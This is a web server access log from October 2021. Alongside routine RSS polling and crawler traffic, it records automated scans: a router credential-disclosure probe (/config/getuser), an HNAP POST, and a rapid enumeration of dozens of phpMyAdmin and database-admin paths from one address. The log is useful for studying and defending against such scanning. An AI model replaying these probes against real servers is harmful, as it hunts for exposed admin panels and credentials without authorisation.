44.234.186.118 - - [18/Oct/2021:08:51:25 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
66.249.64.57 - - [18/Oct/2021:08:53:20 +0200] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.57 - - [18/Oct/2021:08:53:20 +0200] "GET /tag/kubernetes-advanced/ HTTP/1.1" 200 12988 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.173.42.7 - - [18/Oct/2021:08:54:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:09:09:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
198.98.60.202 - - [18/Oct/2021:09:23:57 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
5.173.42.7 - - [18/Oct/2021:09:24:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:09:39:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
147.182.206.135 - - [18/Oct/2021:09:39:13 +0200] "GET / HTTP/1.0" 400 248 "-" "-"
5.173.42.7 - - [18/Oct/2021:09:54:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
192.241.207.8 - - [18/Oct/2021:10:03:25 +0200] "GET /actuator/health HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
5.173.42.7 - - [18/Oct/2021:10:09:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
193.118.53.210 - - [18/Oct/2021:10:17:52 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
5.173.42.7 - - [18/Oct/2021:10:24:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
80.82.77.192 - - [18/Oct/2021:10:33:46 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
5.173.42.7 - - [18/Oct/2021:10:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
34.238.250.23 - - [18/Oct/2021:10:53:17 +0200] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
34.238.250.23 - - [18/Oct/2021:10:53:18 +0200] "GET /rss/ HTTP/1.1" 200 2217 "-" "Ruby"
5.173.42.7 - - [18/Oct/2021:10:54:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
205.185.120.103 - - [18/Oct/2021:11:06:24 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
5.173.42.7 - - [18/Oct/2021:11:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:11:24:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
209.141.62.185 - - [18/Oct/2021:11:29:41 +0200] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
194.163.173.129 - - [18/Oct/2021:11:30:14 +0200] "GET / HTTP/1.1" 301 162 "-" "-"
194.163.173.129 - - [18/Oct/2021:11:30:14 +0200] "POST /HNAP1/ HTTP/1.1" 301 162 "-" "Mozila/5.0"
5.173.42.7 - - [18/Oct/2021:11:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
70.83.6.196 - - [18/Oct/2021:11:46:26 +0200] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:26 +0200] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:27 +0200] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:27 +0200] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:27 +0200] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:28 +0200] "GET /pma/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:28 +0200] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:28 +0200] "GET /PMA2014/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:29 +0200] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:29 +0200] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:29 +0200] "GET /db/webdb/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:30 +0200] "GET /pma/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:30 +0200] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:30 +0200] "GET /PMA2019/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:31 +0200] "GET /pma2018/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:31 +0200] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:31 +0200] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:32 +0200] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:32 +0200] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:32 +0200] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:32 +0200] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:33 +0200] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:33 +0200] "GET /dbadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:33 +0200] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:34 +0200] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:34 +0200] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:34 +0200] "GET /admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:34 +0200] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:35 +0200] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:35 +0200] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:35 +0200] "GET /PMA2015/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:35 +0200] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:36 +0200] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:36 +0200] "GET /sql/websql/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:36 +0200] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:37 +0200] "GET /PMA2011/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:37 +0200] "GET /admin/db/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:38 +0200] "GET /PMA2016/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:38 +0200] "GET /admin/db/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:38 +0200] "GET /database/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:38 +0200] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:39 +0200] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:39 +0200] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:39 +0200] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:40 +0200] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:40 +0200] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:40 +0200] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:40 +0200] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:41 +0200] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:41 +0200] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:41 +0200] "GET /pma2017/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:41 +0200] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:42 +0200] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:42 +0200] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:42 +0200] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:43 +0200] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:43 +0200] "GET /admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:43 +0200] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:43 +0200] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:44 +0200] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:44 +0200] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:44 +0200] "GET /PMA2019/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:45 +0200] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:45 +0200] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:45 +0200] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:45 +0200] "GET /PMA2011/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:46 +0200] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:46 +0200] "GET /db/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:46 +0200] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:47 +0200] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:47 +0200] "GET /PMA2019/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:47 +0200] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:47 +0200] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:48 +0200] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:48 +0200] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:48 +0200] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:48 +0200] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:49 +0200] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:49 +0200] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:49 +0200] "GET /PMA2021/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:50 +0200] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:50 +0200] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:50 +0200] "GET /mysql/db/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
